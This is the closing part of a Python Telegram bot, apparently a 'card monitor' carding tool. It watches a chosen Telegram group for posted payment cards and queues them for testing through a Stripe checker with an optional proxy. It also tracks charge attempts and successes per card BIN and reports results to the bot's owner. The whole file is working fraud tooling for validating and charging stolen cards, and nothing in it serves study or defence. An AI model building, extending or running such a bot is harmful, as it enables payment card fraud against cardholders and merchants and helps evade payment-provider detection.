        logger.info(f"Report sent to owner for BIN {bin_prefix}")
    except Exception as e:
        logger.error(f"Failed to send report: {e}")

# ==================== BOT INITIALIZATION ====================
async def main():
    """Main bot entry point."""
    
    # Validate configuration
    if API_ID == 'YOUR_API_ID' or API_HASH == 'YOUR_API_HASH' or BOT_TOKEN == 'YOUR_BOT_TOKEN':
        logger.error("❌ Please configure your API credentials in config.env")
        logger.error("   Copy config.env.example to config.env and fill in your details")
        return
    
    # Initialize bot
    app = Client(
        "card_monitor_bot",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN
    )
    
    # Load Stripe keys
    stripe_checker.load_keys()
    
    @app.on_message(filters.chat(MONITORED_GROUP_ID))
    async def monitor_group(client: Client, message: Message):
        """Monitor the specified group for card messages."""
        await process_card_message(message, client)
    
    @app.on_message(filters.command("stats") & filters.user(OWNER_USER_ID))
    async def show_stats(client: Client, message: Message):
        """Show bot statistics."""
        uptime = datetime.now() - stats['started_at']
        
        stats_msg = f"""
📊 **Bot Statistics**

⏱ Uptime: `{uptime}`
📈 Total Checked: `{stats['total_checked']}`
✅ Total Succeeded: `{stats['total_succeeded']}`
📊 Success Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
💳 PMI Attempts: `{stats['total_pmi_attempts']}`
💳 PMI Charged: `{stats['total_pmi_succeeded']}`
💳 PMI Rate: `{(stats['total_pmi_succeeded']/stats['total_pmi_attempts']*100) if stats['total_pmi_attempts'] else 0:.1f}%`

🔢 BINs Processed: `{len(stats['bins_processed'])}`
📋 Queue Size: `{len(card_queue)}`
⚙️ Processing: `{len(processing_cards)}`
"""
        await message.reply_text(stats_msg)
    
    @app.on_message(filters.command("proxy") & filters.user(OWNER_USER_ID))
    async def proxy_command(client: Client, message: Message):
        """Enable or disable the Stripe proxy."""
        parts = (message.text or "").split()
        if len(parts) < 2:
            state = "enabled" if stripe_checker.use_proxy else "disabled"
            await message.reply_text(f"Proxy is currently `{state}`. Usage: `/proxy on` or `/proxy off`", disable_web_page_preview=True)
            return
        
        action = parts[1].lower()
        if action in {"on", "enable", "enabled"}:
            stripe_checker.set_proxy_enabled(True)
            await message.reply_text("✅ Proxy enabled.")
        elif action in {"off", "disable", "disabled"}:
            stripe_checker.set_proxy_enabled(False)
            await message.reply_text("⛔ Proxy disabled.")
        else:
            await message.reply_text("Usage: `/proxy on` or `/proxy off`", disable_web_page_preview=True)
    
    # Start the bot
    async with app:
        logger.info("Bot started successfully!")
        logger.info(f"Monitoring group: {MONITORED_GROUP_ID}")
        logger.info(f"Reporting to user: {OWNER_USER_ID}")
        
        # Start queue processor
        asyncio.create_task(process_queue(app))
        
        # Keep the bot running
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
